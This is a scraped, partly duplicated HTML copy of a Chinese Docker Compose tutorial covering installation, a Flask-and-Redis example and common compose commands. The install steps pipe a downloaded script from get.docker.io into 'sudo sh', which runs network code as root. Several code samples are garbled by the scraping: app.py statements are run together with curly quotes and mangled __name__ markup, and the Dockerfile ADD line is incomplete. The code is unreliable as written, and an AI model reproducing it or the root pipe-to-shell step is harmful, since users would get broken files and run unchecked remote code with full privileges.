class=\"crayon-v\">entrypoint</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">entrypoint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-4\"><span class=\"crayon-v\">user</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">postgresql</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-5\"><span class=\"crayon-v\">hostname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-6\"><span class=\"crayon-v\">domainname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-7\"><span class=\"crayon-v\">mem_limit</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1000000000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-8\"><span class=\"crayon-v\">privileged</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-9\"><span class=\"crayon-v\">restart</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">always</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-10\"><span class=\"crayon-v\">stdin_open</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-11\"><span class=\"crayon-v\">tty</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0013 seconds] --><br><p></p><br><h2>4. docker-compose常用命令</h2><br><p>在第二节中的<code>docker-compose up</code>，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：<br><br><code>–verbose</code>：输出详细信息<br><br><code>-f</code> 制定一个非docker-compose.yml命名的yaml文件<br><br><code>-p</code> 设置一个项目名称（默认是directory名）<br><br>docker-compose的动作包括：<br><br><code>build</code>：构建服务<br><br><code>kill -s SIGINT</code>：给服务发送特定的信号。<br><br><code>logs</code>：输出日志<br><br><code>port</code>：输出绑定的端口<br><br><code>ps</code>：输出运行的容器<br><br><code>pull</code>：pull服务的image<br><br><code>rm</code>：删除停止的容器<br><br><code>run</code>: 运行某个服务，例如docker-compose run web python manage.py shell<br><br><code>start</code>：运行某个服务中存在的容器。<br><br><code>stop</code>:停止某个服务中存在的容器。<br><br><code>up</code>：create + run + attach容器到服务。<br><br><code>scale</code>：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3<br><br>参考:<br><br><a href=\"http://docs.docker.com/compose/\" target=\"_blank\" rel=\"external\">Compose Document</a></p><br>                        <div class=\"clear\"></div><br>                                            \n\n<blockquote>\n<p>转载:<a href=\"http://debugo.com/docker-compose\" target=\"_blank\" rel=\"external\">http://debugo.com/docker-compose</a></p>\n</blockquote>\n","excerpt":"","more":"<div class=\"entry-content\"><br>                                                <p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<span id=\"more-1319\"></span></p><br><h2>1. 安装Docker和Compose</h2><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c25730712728\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\"># 当前最新的Docker是1.6.2，Compose为1.2.0<br>curl -s <a href=\"https://get.docker.io/ubuntu/\">https://get.docker.io/ubuntu/</a> | sudo sh<br>sudo apt-get update<br>sudo apt-get install lxc-docker<br># 参考<a href=\"http://docs.docker.com/compose/install/#install-compose\">http://docs.docker.com/compose/install/#install-compose</a><br>curl -L <a href=\"https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname\">https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname</a> -s<code>-</code>uname -m<code>&amp;gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U docker-compose&lt;/textarea&gt;&lt;/div&gt;\n            &lt;div class=&quot;crayon-main&quot; style=&quot;position: relative; z-index: 1; overflow: hidden;&quot;&gt;\n                &lt;table class=&quot;crayon-table&quot;&gt;\n                    &lt;tbody&gt;&lt;tr class=&quot;crayon-row&quot;&gt;\n                &lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;\n                    &lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 12px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-1&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-2&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-3&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-4&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-5&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-6&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-7&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-8&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-9&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-580270f9a8c25730712728-10&quot;&gt;10&lt;/div&gt;&lt;/div&gt;\n                &lt;/td&gt;\n                        &lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-580270f9a8c25730712728-1&quot;&gt;&lt;span class=&quot;crayon-p&quot;&gt;# 当前最新的Docker是1.6.2，Compose为1.2.0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-580270f9a8c25730712728-2&quot;&gt;&lt;span class=&quot;crayon-v&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//get.docker.io/ubuntu/ | sudo sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-580270f9a8c25730712728-3&quot;&gt;&lt;span class=&quot;crayon-e&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;update&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-580270f9a8c25730712728-4&quot;&gt;&lt;span class=&quot;crayon-e&quot;&gt;sudo &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;apt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;get &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;install &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lxc&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;docker&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-580270f9a8c25730712728-5&quot;&gt;&lt;span class=&quot;crayon-p&quot;&gt;# 参考http://docs.docker.com/compose/install/#install-compose&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-580270f9a8c25730712728-6&quot;&gt;&lt;span class=&quot;crayon-v&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//github.com/docker/compose/releases/download/1.2.0/docker-compose-</code>uname -s<code>-</code>uname -m` &gt; /usr/local/bin/docker-compose</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-7\"><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-8\"><span class=\"crayon-p\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-9\"><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-10\"><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">U</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0020 seconds] --><br><p></p><br><p>这样compose就安装好了，查看一下compose的版本信息：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c44835397497\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">chmod +x /usr/local/bin/docker-compose<br>docker-compose -version<br>docker-compose 1.2.0</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c44835397497-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-3\">3</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-1\"><span class=\"crayon-r\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c44835397497-2\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">version</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-3\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.2.0</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0011 seconds] --><br><p></p><br><h2>2. 使用Compose</h2><br><p>使用Compose只需要简单的三个步骤：<br><br>首先，使用Dockerfile来定义你的应用环境：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c48878639680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">FROM python:2.7<br>ADD ./code<br>WORKDIR /code<br>RUN pip install -r requirements.txt</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-4\">4</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-2\"><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-3\"><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">requirements</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0008 seconds] --><br><p></p><br><p>其中，requirements.txt中的内容包括：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c4d809478886\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">flask<br>redis</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c4d809478886-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c4d809478886-2\">2</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c4d809478886-1\"><span class=\"crayon-e\">flask</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c4d809478886-2\"><span class=\"crayon-v\">redis</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0003 seconds] --><br><p></p><br><p>再用Python写一个简单的app.py</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c51291884198\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">from flask importFlaskfrom redis importRedisimport os<br>app =Flask(<strong>name</strong>)<br>redis =Redis(host=’redis’, port=6379)@app.route(‘/‘)def hello():<br>    redis.incr(‘hits’)return’Hello World! I have been seen %s times.’% redis.get(‘hits’)if <strong>name</strong> ==”<strong>main</strong>“:<br>    app.run(host=”0.0.0.0”, debug=True)</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-5\">5</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-1\"><span class=\"crayon-st\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">flask </span><span class=\"crayon-e\">importFlaskfrom </span><span class=\"crayon-e\">redis </span><span class=\"crayon-e\">importRedisimport </span><span class=\"crayon-k \">os</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-2\"><span class=\"crayon-v\">app</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Flask</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\"><strong>name</strong></span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-3\"><span class=\"crayon-v\">redis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">‘redis’</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">route</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">‘/‘</span><span class=\"crayon-sy\">)</span><span class=\"crayon-r\">def</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">hello</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-4\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">incr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">‘hits’</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">return</span><span class=\"crayon-s\">‘Hello World! I have been seen %s times.’</span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">‘hits’</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\"><strong>name</strong></span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">“<strong>main</strong>“</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">“0.0.0.0”</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">debug</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">)</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0027 seconds] --><br><p></p><br><p><strong>第二步</strong>，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用。</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c55508636029\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">web:<br>  build:.<br>  command: python app.py<br>  ports:<br>         - “5000:5000”<br>  volumes:<br>         - .:/code<br>  links:<br>         - redis<br>redis:<br>  image: redis</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-11\">11</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-1\"><span class=\"crayon-s \">web</span><span class=\"\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">command</span><span class=\"\">: python app.py</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-i \">“5000:5000”</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-6\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">volumes</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-o\">.</span><span class=\"\">:/code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-8\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-9\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span>redis</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-10\"><span class=\"crayon-s \">redis</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: redis</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0007 seconds] --><br><p></p><br><p><strong>第三步</strong>，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。</p><br><p></p><!-- Crayon 